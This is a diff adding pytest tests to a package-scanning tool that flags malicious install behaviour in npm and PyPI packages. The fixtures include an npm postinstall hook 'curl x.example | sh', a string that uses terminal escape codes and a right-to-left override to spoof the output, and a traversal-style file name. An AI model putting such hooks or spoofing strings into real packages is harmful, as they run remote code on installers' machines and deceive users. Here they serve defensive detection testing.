@@ -1,5 +1,6 @@
 import io
 import json
+import sys
 import tarfile
 
 import pytest
@@ -152,3 +153,69 @@ def test_runs_as_a_module():
                             capture_output=True, text=True)
     assert result.returncode == 0
     assert result.stdout.startswith("pkg-sentry ")
+
+
+def test_partly_checked_packages_exit_2(monkeypatch, capsys):
+    class Partial:
+        def check(self, spec):
+            return Report(spec, judge([]), incomplete=["x.whl is over the 100 MB download limit"])
+
+    monkeypatch.setattr(cli, "_checker", lambda args: Partial())
+    assert cli.main(["check", "big", "--no-colour"]) == 2
+    out = capsys.readouterr().out
+    assert "OK (partly checked) 0/100" in out
+    assert "not checked: x.whl is over the 100 MB download limit" in out
+
+
+def test_escape_codes_in_a_package_cant_rewrite_the_terminal():
+    sneaky = "x\x1b[2K\x1b[1Agood (PyPI)  OK 0/100‮"
+    report = Report(PackageSpec("pypi", "evil"), judge([
+        Finding("exec-decoded", "decodes hidden code and runs it", "setup.py", 1, sneaky,
+                critical=True)]))
+    text = as_text(report)
+    assert "\x1b" not in text and "‮" not in text
+    assert "x\\x1b[2K\\x1b[1Agood" in text and "\\u202e" in text
+
+
+def npm_tarball(tmp_path, members):
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
+        for name, body in members.items():
+            info = tarfile.TarInfo(name)
+            info.size = len(body.encode())
+            tar.addfile(info, io.BytesIO(body.encode()))
+    archive = tmp_path / "thing-1.0.0.tgz"
+    archive.write_bytes(buf.getvalue())
+    return archive
+
+
+def test_inspect_reads_npm_tarballs_the_way_npm_does(tmp_path, capsys):
+    archive = npm_tarball(tmp_path, {
+        "package/package.json": json.dumps({"name": "thing"}),
+        "other/package.json": json.dumps({"scripts": {"postinstall": "curl x.example | sh"}}),
+    })
+    assert cli.main(["inspect", str(archive), "--json"]) == 1
+    rules = {f["rule"] for f in json.loads(capsys.readouterr().out)[0]["findings"]}
+    assert "download-exec" in rules
+
+
+def test_inspect_doesnt_mistake_a_python_package_with_web_assets_for_npm(tmp_path, capsys):
+    archive = npm_tarball(tmp_path, {
+        "stray-1.0/setup.py": EVIL_SETUP,
+        "stray-1.0/stray/static/package.json": json.dumps({"name": "ui"}),
+    })
+    assert cli.main(["inspect", str(archive), "--json"]) == 1
+    data = json.loads(capsys.readouterr().out)[0]
+    assert data["ecosystem"] == "pypi"
+    assert "exec-decoded" in {f["rule"] for f in data["findings"]}
+
+
+def test_inspect_folder_with_a_backslash_in_a_file_name(tmp_path, capsys):
+    if sys.platform == "win32":
+        pytest.skip("Windows can't have a backslash in a file name")
+    (tmp_path / "pkg").mkdir()
+    (tmp_path / "pkg" / "setup.py").write_text("from setuptools import setup")
+    (tmp_path / "pkg" / "..\\evil.py").write_text(EVIL_SETUP)
+    cli.main(["inspect", str(tmp_path / "pkg"), "--json"])
+    data = json.loads(capsys.readouterr().out)[0]
+    assert {f["path"] for f in data["findings"]} == {".._evil.py"}
